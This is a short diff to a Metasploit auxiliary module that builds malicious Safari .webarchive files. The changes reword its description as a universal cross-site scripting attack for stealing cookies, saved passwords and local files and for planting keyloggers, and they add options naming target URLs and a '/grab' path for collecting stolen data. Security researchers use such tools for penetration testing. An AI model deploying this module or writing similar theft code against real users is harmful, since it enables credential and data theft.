@@ -24,8 +24,9 @@ class Metasploit3 < Msf::Auxiliary
 				in Safari's .webarchive file format. The format allows you to
 				specify both domain and content, so we can run arbitrary script in the
 				context of any domain. This allows us to steal cookies, file URLs, and saved
-				passwords from any website we want. On sites that link to cached javascripts,
-				we can poison the user's browser cache and install keyloggers.
+				passwords from any website we want -- in other words, it is a universal
+				cross-site scripting vector (UXSS). On sites that link to cached javascripts,
+				we can additionally poison user's browser cache and install keyloggers.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => 'joev',
@@ -47,7 +48,8 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webarchive']),
-				OptString.new('URLS', [ true, 'The URLs to steal cookie and form data from.', '']),
+				OptString.new('URLS', [ true, 'A space-delimited list of URLs to UXSS (eg http//browserscan.rapid7.com/']),
+				OptString.new('URIPATH', [false, 'The URI to receive the UXSS\'ed data', '/grab']),
 				OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal.', '']),
 				OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing.", true]),
 				OptBool.new('STEAL_FILES', [true, "Enable local file stealing.", true]),
